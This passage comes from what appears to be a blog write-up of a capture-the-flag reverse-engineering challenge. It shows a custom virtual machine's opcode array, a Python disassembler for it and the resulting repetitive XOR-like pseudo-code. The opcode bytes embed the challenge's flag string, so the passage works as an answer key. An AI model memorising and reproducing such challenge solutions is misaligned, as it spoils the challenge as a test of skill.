class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, </span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x99</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">match</span> code:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xa1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num - 1] = or_not_num &amp; or_num&quot;</span> )</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_num = b1 | b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xb2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_1 = ~b1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_2 = ~b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xf1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b1 = input[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num += 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b2 = input[now_num]&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xd4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_not_num = not_2 | not_1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbf</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;save = last[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num+=1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num = 0&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbb</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num-1] = now_num + save - 1&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span 